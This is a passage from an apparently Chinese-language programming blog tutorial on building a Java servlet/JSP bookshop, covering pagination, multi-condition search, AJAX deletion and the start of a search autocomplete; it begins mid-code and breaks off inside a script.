fc);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Color(r, g, b);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@see</span> HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">      <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">      doGet(request, response);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、添加购物车"><a href="#2、添加购物车" class="headerlink" title="2、添加购物车"></a>2、添加购物车</h4><p>myweb3/bookshop</p>
<h4 id="3、分页查询"><a href="#3、分页查询" class="headerlink" title="3、分页查询"></a>3、分页查询</h4><ul>
<li>创建<code>PageBean</code>实体类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PageBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> pageNo;<span class="comment">// 当前第多少页</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> pageSize;<span class="comment">// 每页大小</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> totalItemCount;<span class="comment">// 总记录数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> totalPageCount;<span class="comment">//总页数</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 数据载体,即当前页要显示的数据</span></span><br><span class="line"><span class="comment">     * 封装当前页的所有Book对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Book&gt; data;</span><br></pre></td></tr></table></figure>

<ul>
<li>pagelist.jsp(数据来源，pageBean)</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;序号&lt;ath&gt;</span><br><span class="line">        &lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;价格&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;目录&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;库存&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;图片&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;类型&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;作者&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;sales&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;删除&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;修改&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;c:forEach items=<span class="string">&quot;$&#123;pageBean.data&#125;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;li&quot;</span> varStatus=<span class="string">&quot;vs&quot;</span>&gt;</span><br><span class="line">        &lt;tr $&#123;vs.count%<span class="number">2</span>==<span class="number">1</span>? <span class="string">&quot;style=&#x27;background-color:yellow&#x27;&quot;</span>:<span class="string">&quot;&quot;</span>&#125;&gt;</span><br><span class="line">            &lt;td&gt;$&#123;li.id&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;detail&quot;</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;detail?id=$&#123;li.id&#125;&quot;</span>&gt;</span>$&#123;li.name&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;li.price&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;li.category&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;li.pnum&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;images/$&#123;li.imgurl&#125;&quot;</span>/&gt;</span></span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;li.description&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;li.author&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;li.sales&#125;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;/c:forEach&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/c:<span class="keyword">if</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;page&quot;</span>&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;page?pageNo=$&#123;pageBean.pageNo==1?1:pageBean.pageNo-1&#125;&quot;</span>&gt;&amp;lt;&amp;lt;上一页&lt;/a&gt;&amp;nbsp;&amp;nbsp;</span><br><span class="line">    第$&#123;pageBean.pageNo&#125;页/共$&#123;pageBean.totalPageCount&#125;页&amp;nbsp;&amp;nbsp;总$&#123;pageBean.totalItemCount&#125;条记录&amp;nbsp;&amp;nbsp;</span><br><span class="line">    &lt;a href=<span class="string">&quot;page?pageNo=$&#123;pageBean.pageNo==pageBean.totalPageCount?pageBean.totalPageCount:pageBean.pageNo+1&#125;&quot;</span>&gt;下一页&amp;gt;&amp;gt;&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>pageServlet</code>根据pageNo,pageSize得到<code>pageBean</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//默认第一页</span></span><br><span class="line"><span class="keyword">int</span> pageNo=<span class="number">1</span>;</span><br><span class="line">String pageIndex=req.getParameter(<span class="string">&quot;pageNo&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pageIndex !=<span class="keyword">null</span>)&#123;</span><br><span class="line">    pageNo=Integer.parseInt(pageIndex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//设置一页显示几页</span></span><br><span class="line"><span class="keyword">int</span> pageSize=<span class="number">5</span>;</span><br><span class="line">PageService pageService=<span class="keyword">new</span> PageService();</span><br><span class="line">PageBean pageBean=pageService.getPageBean(pageNo,pageSize);</span><br><span class="line">req.setAttribute(<span class="string">&quot;pageBean&quot;</span>,pageBean);</span><br><span class="line">req.getRequestDispatcher(<span class="string">&quot;pagelist.jsp&quot;</span>).forward(req, resp);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>getPageBean(pageNo,pageSize)</code> dao层方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> PageBean <span class="title">getPageBean</span><span class="params">(<span class="keyword">int</span> pageNo, <span class="keyword">int</span> pageSize)</span></span>&#123;</span><br><span class="line">    <span class="comment">//pageBean实体类</span></span><br><span class="line">    PageBean pageBean=<span class="keyword">new</span> PageBean();</span><br><span class="line">    pageBean.setPageNo(pageNo);</span><br><span class="line">    pageBean.setPageSize(pageSize);</span><br><span class="line">    <span class="comment">//获取记录总数</span></span><br><span class="line">    <span class="keyword">long</span> totalItemCount=bookDao.getTotalItemCount();</span><br><span class="line">    pageBean.setTotalItemCount((<span class="keyword">int</span>) totalItemCount);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置页数</span></span><br><span class="line">    <span class="keyword">int</span> totalPageCount=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (totalItemCount&gt;<span class="number">0</span> &amp;&amp; pageSize&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        totalPageCount=(<span class="keyword">int</span>)Math.ceil(totalItemCount*<span class="number">1.0</span>/pageSize);</span><br><span class="line">        pageBean.setTotalPageCount(totalPageCount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置每页记录的集合</span></span><br><span class="line">    List&lt;Book&gt; data=bookDao.showAllBook();</span><br><span class="line">    <span class="keyword">if</span> (pageNo&lt;totalPageCount)&#123;</span><br><span class="line">        pageBean.setData(data.subList((pageNo-<span class="number">1</span>)*pageSize,pageNo*pageSize));</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (pageNo==totalPageCount)&#123;</span><br><span class="line">        <span class="comment">//最后一页</span></span><br><span class="line">        pageBean.setData(data.subList((pageNo-<span class="number">1</span>)*pageSize,data.size()));</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException(<span class="string">&quot;超出页数范围&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pageBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="多条件查询-分页"><a href="#多条件查询-分页" class="headerlink" title="多条件查询+分页"></a>多条件查询+分页</h5><ul>
<li>前端得到多条件查询条件，查找符合条件的pageBean<ul>
<li>在分页条件要加上 <strong>查询条件</strong></li>
</ul>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;pageSearch&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    搜索图书:<span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入图书关键字&quot;</span>/&gt;</span></span>&lt;br&gt;</span><br><span class="line">    搜索类别:<span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;category&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入图书类别&quot;</span>/&gt;</span></span>&lt;br&gt;</span><br><span class="line">    作者:<span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入图书作者&quot;</span>/&gt;</span></span>&lt;br&gt;</span><br><span class="line">    价格区间:<span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;minPrice&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;最低价&quot;</span>/&gt;</span></span></span><br><span class="line">    到&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;maxPrice&quot;</span> placeholder=<span class="string">&quot;最高价&quot;</span>/&gt;&lt;br&gt;</span><br><span class="line">    销量大于:<span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sales&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;销量&quot;</span>/&gt;</span></span>&lt;br&gt;</span><br><span class="line"></span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;搜索&quot;</span>/&gt;&amp;nbsp&lt;input type=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;全部&quot;</span> onclick=<span class="string">&quot;location.href=&#x27;bookStoreShow1&#x27;&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;c:<span class="keyword">if</span> test=<span class="string">&quot;$&#123;not empty pageBean&#125;&quot;</span>&gt;</span><br><span class="line">    &lt;table&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;序号&lt;ath&gt;</span><br><span class="line">            &lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;价格&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;目录&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;库存&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;图片&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;类型&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;作者&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;sales&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;删除&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;修改&lt;/th&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;c:forEach items=<span class="string">&quot;$&#123;pageBean.data&#125;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;li&quot;</span> varStatus=<span class="string">&quot;vs&quot;</span>&gt;</span><br><span class="line">            &lt;tr $&#123;vs.count%<span class="number">2</span>==<span class="number">1</span>? <span class="string">&quot;style=&#x27;background-color:yellow&#x27;&quot;</span>:<span class="string">&quot;&quot;</span>&#125;&gt;</span><br><span class="line">                &lt;td&gt;$&#123;li.id&#125;&lt;/td&gt;</span><br><span class="line">                &lt;td <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;detail&quot;</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;detail?id=$&#123;li.id&#125;&quot;</span>&gt;</span>$&#123;li.name&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span>&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;$&#123;li.price&#125;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;$&#123;li.category&#125;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;$&#123;li.pnum&#125;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;images/$&#123;li.imgurl&#125;&quot;</span>/&gt;</span></span>&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;$&#123;li.description&#125;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;$&#123;li.author&#125;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;$&#123;li.sales&#125;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">        &lt;/c:forEach&gt;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line">&lt;/c:<span class="keyword">if</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;page&quot;</span>&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;pageSearch?pageNo=$&#123;pageBean.pageNo==1?1:pageBean.pageNo-1&#125; &amp;name=$&#123;name&#125; &amp;category=$&#123;category&#125;&amp;author=$&#123;author&#125;&amp;minPrice=$&#123;minPrice&#125;&amp;maxPrice=$&#123;maxPrice&#125;&amp;sales=$&#123;sales&#125;&quot;</span> &gt;&amp;lt;&amp;lt;上一页&lt;/a&gt;&amp;nbsp;&amp;nbsp;</span><br><span class="line">    第$&#123;pageBean.pageNo&#125;页/共$&#123;pageBean.totalPageCount&#125;页&amp;nbsp;&amp;nbsp;总$&#123;pageBean.totalItemCount&#125;条记录&amp;nbsp;&amp;nbsp;</span><br><span class="line">    &lt;a href=<span class="string">&quot;pageSearch?pageNo=$&#123;pageBean.pageNo==pageBean.totalPageCount?pageBean.totalPageCount:pageBean.pageNo+1&#125;&amp;name=$&#123;name&#125;&amp;category=$&#123;category&#125;&amp;author=$&#123;author&#125;&amp;minPrice=$&#123;minPrice&#125;&amp;maxPrice=$&#123;maxPrice&#125;&amp;sales=$&#123;sales&#125;&quot;</span>&gt;下一页&amp;gt;&amp;gt;&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>SearchPageServlet</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">req.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="comment">//1、第一次进入jsp查询并无pageNo属性，需要初始化</span></span><br><span class="line"><span class="comment">//2、分页时，通过获得pageNo属性，得到pageBean对象,显示数据</span></span><br><span class="line"><span class="keyword">int</span> pageNo=<span class="number">1</span>;</span><br><span class="line">String pageIndex=req.getParameter(<span class="string">&quot;pageNo&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pageIndex!=<span class="keyword">null</span>)&#123;</span><br><span class="line">    pageNo=Integer.parseInt(pageIndex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> pageSize=<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">String name=req.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">String category=req.getParameter(<span class="string">&quot;category&quot;</span>);</span><br><span class="line">String author=req.getParameter(<span class="string">&quot;author&quot;</span>);</span><br><span class="line">String minPrice=req.getParameter(<span class="string">&quot;minPrice&quot;</span>);</span><br><span class="line">String maxPrice=req.getParameter(<span class="string">&quot;maxPrice&quot;</span>);</span><br><span class="line">String sales=req.getParameter(<span class="string">&quot;sales&quot;</span>);</span><br><span class="line">PageService pageService=<span class="keyword">new</span> PageService();</span><br><span class="line">PageBean pageBean=pageService.getPageBean(pageNo,pageSize,name,category,author,minPrice,maxPrice,sales);</span><br><span class="line">System.out.println(pageBean);</span><br><span class="line"></span><br><span class="line"><span class="comment">//传递给jsp进行显示数据</span></span><br><span class="line">req.setAttribute(<span class="string">&quot;pageBean&quot;</span>,pageBean);</span><br><span class="line"></span><br><span class="line">req.setAttribute(<span class="string">&quot;name&quot;</span>,name);</span><br><span class="line">req.setAttribute(<span class="string">&quot;category&quot;</span>,category);</span><br><span class="line">req.setAttribute(<span class="string">&quot;author&quot;</span>,author);</span><br><span class="line">req.setAttribute(<span class="string">&quot;minPrice&quot;</span>,minPrice);</span><br><span class="line">req.setAttribute(<span class="string">&quot;maxPrice&quot;</span>,maxPrice);</span><br><span class="line">req.setAttribute(<span class="string">&quot;sales&quot;</span>,sales);</span><br><span class="line"></span><br><span class="line">req.getRequestDispatcher(<span class="string">&quot;pageSearch.jsp&quot;</span>).forward(req, resp);</span><br></pre></td></tr></table></figure>

<ul>
<li>多条件查询</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> PageBean <span class="title">getPageBean</span><span class="params">(<span class="keyword">int</span> pageNo, <span class="keyword">int</span> pageSize,String name,String category,String author,</span></span></span><br><span class="line"><span class="function"><span class="params">                            String minPrice,String maxPrice,String sales)</span></span>&#123;</span><br><span class="line">    <span class="comment">//pageBean实体类</span></span><br><span class="line">    PageBean pageBean=<span class="keyword">new</span> PageBean();</span><br><span class="line">    pageBean.setPageNo(pageNo);</span><br><span class="line">    pageBean.setPageSize(pageSize);</span><br><span class="line">    BookDao bookDao=<span class="keyword">new</span> BookDao();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取记录总数</span></span><br><span class="line">    <span class="keyword">long</span> totalItemCount=bookDao.getTotalItemCount(name,category,author,minPrice,maxPrice,sales);</span><br><span class="line">    pageBean.setTotalItemCount(totalItemCount);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置页数</span></span><br><span class="line">    <span class="keyword">int</span> totalPageCount=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (totalItemCount&gt;<span class="number">0</span> &amp;&amp; pageSize&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        totalPageCount=(<span class="keyword">int</span>)Math.ceil(totalItemCount*<span class="number">1.0</span>/pageSize);</span><br><span class="line">        pageBean.setTotalPageCount(totalPageCount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    List&lt;Book&gt; data=bookDao.searchBooks(name, category, author, minPrice, maxPrice, sales);</span><br><span class="line">    <span class="comment">//设置每页记录的集合</span></span><br><span class="line">    <span class="keyword">if</span> (pageNo&lt;totalPageCount)&#123;</span><br><span class="line">        pageBean.setData(data.subList((pageNo-<span class="number">1</span>)*pageSize,pageNo*pageSize));</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (pageNo==totalPageCount)&#123;</span><br><span class="line">        <span class="comment">//最后一页</span></span><br><span class="line">        pageBean.setData(data.subList((pageNo-<span class="number">1</span>)*pageSize,data.size()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pageBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4、过滤器登录验证"><a href="#4、过滤器登录验证" class="headerlink" title="4、过滤器登录验证"></a>4、过滤器登录验证</h4><p>见过滤器</p>
<h4 id="5、多条件查询"><a href="#5、多条件查询" class="headerlink" title="5、多条件查询"></a>5、多条件查询</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    req.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">    String name=req.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    String category=req.getParameter(<span class="string">&quot;category&quot;</span>);</span><br><span class="line">    String author=req.getParameter(<span class="string">&quot;author&quot;</span>);</span><br><span class="line">    String minPrice=req.getParameter(<span class="string">&quot;minPrice&quot;</span>);</span><br><span class="line">    String maxPrice=req.getParameter(<span class="string">&quot;maxPrice&quot;</span>);</span><br><span class="line">    String sales=req.getParameter(<span class="string">&quot;sales&quot;</span>);</span><br><span class="line"></span><br><span class="line">    BookService bookService=<span class="keyword">new</span> BookService();</span><br><span class="line">    List&lt;Book&gt; list=bookService.searchBooks(name,category,author,minPrice,maxPrice,sales);</span><br><span class="line"></span><br><span class="line">    req.setAttribute(<span class="string">&quot;list&quot;</span>,list);</span><br><span class="line">    req.getRequestDispatcher(<span class="string">&quot;showbook.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;search&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    书名:<span class="xml"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;searchName&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span>&lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;searchName&quot; autocomplete=&quot;off&quot; placeholder=&quot;请输入图书关键字&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;div id=&quot;context1&quot; style=&quot;display: none;width: 175px;background-color: #b3a4a4;position: absolute; left: 55px;z-index: 100;border: 1px #ac3a3a solid&quot;&gt;&lt;/div&gt;</span><br><span class="line">    搜索图书:&lt;label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;name&quot; placeholder=&quot;请输入图书关键字&quot;/&gt;</span><br><span class="line">&lt;/label&gt;&lt;br&gt;</span><br><span class="line">    搜索类别:&lt;label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;category&quot; placeholder=&quot;请输入图书类别&quot;/&gt;</span><br><span class="line">&lt;/label&gt;&lt;br&gt;</span><br><span class="line">    作者:&lt;label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;author&quot; placeholder=&quot;请输入图书作者&quot;/&gt;</span><br><span class="line">&lt;/label&gt;&lt;br&gt;</span><br><span class="line">    价格区间:&lt;label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;minPrice&quot; placeholder=&quot;最低价&quot;/&gt;</span><br><span class="line">&lt;/label&gt;</span><br><span class="line">    到&lt;label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;maxPrice&quot; placeholder=&quot;最高价&quot;/&gt;</span><br><span class="line">&lt;/label&gt;&lt;br&gt;</span><br><span class="line">    销量大于:&lt;label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;sales&quot; placeholder=&quot;销量&quot;/&gt;</span><br><span class="line">&lt;/label&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;搜索&quot;/&gt;&amp;nbsp;&amp;nbsp;&lt;input type=&quot;button&quot;</span><br><span class="line">    value=&quot;全部&quot; onclick=&quot;location.href=&#x27;bookStoreShow1&#x27;&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<h4 id="6、ajax异步删除"><a href="#6、ajax异步删除" class="headerlink" title="6、ajax异步删除"></a>6、ajax异步删除</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> id=Integer.parseInt(req.getParameter(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">    BookService bookService=<span class="keyword">new</span> BookService();</span><br><span class="line">    <span class="keyword">int</span> count=bookService.deleteBook(id);</span><br><span class="line">    resp.getWriter().print(count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//实现异步删除</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delBook</span>(<span class="params">dom,id</span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">       url:<span class="string">&quot;delBook2&quot;</span>,</span><br><span class="line">       type:<span class="string">&quot;get&quot;</span>,</span><br><span class="line">       data:<span class="string">&#x27;id=&#x27;</span>+id,</span><br><span class="line">       success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (result&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                $(dom).parent().parent().remove();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                alert(<span class="string">&quot;删除失败&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;,</span><br><span class="line">        error:<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            alert(<span class="string">&quot;执行失败&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//异步批量删除</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delChecks</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">&quot;.checks&quot;</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params">i,e</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($(e).is(<span class="string">&quot;:checked&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">const</span> id = $(e).val();</span><br><span class="line">            delBook(e,id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="7、上传和下载"><a href="#7、上传和下载" class="headerlink" title="7、上传和下载"></a>7、上传和下载</h4><h4 id="8、搜索框自动补全"><a href="#8、搜索框自动补全" class="headerlink" title="8、搜索框自动补全"></a>8、搜索框自动补全</h4><ul>
<li><strong>ajax异步通信</strong></li>
<li>得到Json字符串（即符合条件的Book集合）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    req.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">    resp.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">    String name = req.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    List&lt;Book&gt; bookList = <span class="keyword">new</span> BookService().findBookByName(name);</span><br><span class="line"></span><br><span class="line">    Gson gson=<span class="keyword">new</span> Gson();</span><br><span class="line">    <span class="comment">//创建Json字符串</span></span><br><span class="line">    String json = gson.toJson(bookList);</span><br><span class="line">    System.out.println(json);</span><br><span class="line">    resp.getWriter().write(json);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>前端接收Json字符串</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="comment">//将点击的内容放到搜素框</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setSearch_onclick</span>(<span class="params">div</span>) </span>&#123;</span><br><span class="line">        $(<span class="string">&quot;#searchName&quot;</span>).val(div.innerText);</span><br><span class="line">        $(<span class="string">&quot;#context1&quot;</span>).css(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;none&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="string">&quot;#searchName&quot;</span>).keyup(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> content = $(<span class="built_in">this</span>).val();</span><br><span class="line">        <span class="keyword">if</span> (content === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            $(<span class="string">&quot;#context1&quot;</span>).css(<span class="string">&quot;display&quot;</span>, <span 